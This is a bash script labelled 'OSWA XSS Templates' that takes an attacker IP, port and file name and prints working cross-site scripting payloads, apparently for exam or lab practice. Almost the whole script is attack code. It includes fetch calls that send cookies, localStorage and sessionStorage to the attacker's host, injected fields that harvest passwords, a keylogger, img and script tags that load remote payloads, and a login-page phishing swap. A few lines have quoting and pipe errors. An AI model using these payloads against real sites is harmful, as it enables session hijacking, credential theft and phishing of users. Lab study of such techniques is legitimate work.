#!/bin/bash

GRAY="\033[0;37m"
RESET="\033[0m"

echo "========================="
echo "OSWA XSS Templates"
echo "Designed By Cuong Nguyen"
echo "========================="

# Prompt for IP address and Port
read -p "[?] Enter the IP address: " IP
read -p "[?] Enter the Port: " PORT
read -p "[?] Enter the File: " FILE
echo
echo

# Create an output file named xxs_<IP>.txt
OUTPUT_FILE="xxs_$IP.txt"

# Start writing to the output file
echo "XSS Program Started for IP: $IP" > "$OUTPUT_FILE"
echo "---------------------------------" >> "$OUTPUT_FILE"
echo "XSS Program Designed By Cuong" >> "$OUTPUT_FILE"
echo "---------------------------------" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

# Displaying headers and corresponding JavaScript snippets
echo -e "\033[31m[!] Steal Session Cookies:\033[0m" | tee -a "$OUTPUT_FILE"
echo "let cookie = document.cookie" | tee -a "$OUTPUT_FILE"
echo "let encodedCookie = encodeURIComponent(cookie)" | tee -a "$OUTPUT_FILE"
echo "fetch(\"http://$IP:$PORT/exfil?data=\" + encodedCookie)" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo
echo "fetch('http://$IP:$PORT/session?'+encodeURIComponent(localStorage.token));|" | tee -a "$OUTPUT_FILE"
echo
echo -e "\033[31m[!] Steal Session Passwords:\033[0m" | tee -a "$OUTPUT_FILE"
echo "let body = document.getElementsByTagName('body')[0];" | tee -a "$OUTPUT_FILE"
echo "var u = document.createElement('input');" | tee -a "$OUTPUT_FILE"
echo "u.type = 'text';" | tee -a "$OUTPUT_FILE"
echo "u.style.position = 'fixed';" | tee -a "$OUTPUT_FILE"
echo "//u.style.opacity = '0';" | tee -a "$OUTPUT_FILE"
echo "var p = document.createElement('input');" | tee -a "$OUTPUT_FILE"
echo "p.type = 'password';" | tee -a "$OUTPUT_FILE"
echo "p.style.position = 'fixed';" | tee -a "$OUTPUT_FILE"
echo "//p.style.opacity = '0';" | tee -a "$OUTPUT_FILE"
echo "body.append(u);" | tee -a "$OUTPUT_FILE"
echo "body.append(p);" | tee -a "$OUTPUT_FILE"
echo "setTimeout(function(){" | tee -a "$OUTPUT_FILE"
echo "fetch('http://$IP:$PORT/k?u=' + u.value + '&p=' + p.value)" | tee -a "$OUTPUT_FILE"
echo "}, 5000);" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

echo -e "\033[31m[!] Steal Local Secrets (Local Storage):\033[0m" | tee -a "$OUTPUT_FILE"
echo "let data = JSON.stringify(localStorage);" | tee -a "$OUTPUT_FILE"
echo "let encodedData = encodeURIComponent(data);" | tee -a "$OUTPUT_FILE"
echo "fetch(\"http://$IP:$PORT/exfil?data=\" + encodedData)" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "fetch('http://$IP:$PORT/session?'+encodeURIComponent(localStorage.token));|" tee -a "$OUTPUT_FILE"
echo
echo -e "\033[31m[!] Steal Local Secrets(Session Storage):\033[0m" | tee -a "$OUTPUT_FILE"
echo "let data = JSON.stringify(sessionStorage);" | tee -a "$OUTPUT_FILE"
echo "let encodedData = encodeURIComponent(data);" | tee -a "$OUTPUT_FILE"
echo "fetch(\"http://$IP:$PORT/exfil?data=\" + encodedData)" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

echo -e "\033[31m[!] Steal Session Cookies - document.write() method:\033[0m" | tee -a "$OUTPUT_FILE"
echo "document.write('<img src="http://$IP:$PORT/?bogus='+document.cookie+'" />');" | tee -a "$OUTPUT_FILE"
echo ""



echo -e "\033[31m[!] XSS Payload 1:\033[0m" | tee -a "$OUTPUT_FILE"
echo "<img src='x' onerror='src=\"http://$IP:$PORT/$FILE\"'>" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

echo -e "\033[31m[!] XSS Payload 2:\033[0m" | tee -a "$OUTPUT_FILE"
echo "<img src='x' onerror='const script = document.createElement(\"script\"); script.src=\"http://$IP:$PORT/$FILE\";script.async = true;console.log(\"Script Loaded\");document.body.appendChild(script);'>" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

echo -e "\033[31m[!] XSS Payload 3:\033[0m" | tee -a "$OUTPUT_FILE"
echo "<script src=\"http://$IP:$PORT/$FILE\"></script>" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

echo -e "\033[31m[!] XSS Payload 4:\033[0m" | tee -a "$OUTPUT_FILE"
echo "<img src=x onerror='fetch("http://$IP:$PORT/$FILE")'>" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

echo -e "\033[31m[!] Keylogger:\033[0m" | tee -a "$OUTPUT_FILE"
echo "function logKey(event){" | tee -a "$OUTPUT_FILE"
echo "  fetch(\"http://$IP:$PORT/k?key=\" + event.key)" | tee -a "$OUTPUT_FILE"
echo "}" | tee -a "$OUTPUT_FILE"
echo "document.addEventListener('keydown', logKey);" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

echo -e "\033[31m[!] Phish:\033[0m" | tee -a "$OUTPUT_FILE"
echo "fetch('/search/login').then(res => res.text().then(data => {" | tee -a "$OUTPUT_FILE"
echo "  document.getElementsByTagName(\"html\")[0].innerHTML = data;" | tee -a "$OUTPUT_FILE"
echo "  document.getElementsByTagName(\"form\")[0].action = '[http://$IP](http://$IP)';" | tee -a "$OUTPUT_FILE"
echo "  document.getElementsByTagName(\"form\")[0].method = 'get';" | tee -a "$OUTPUT_FILE"
echo "}));" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
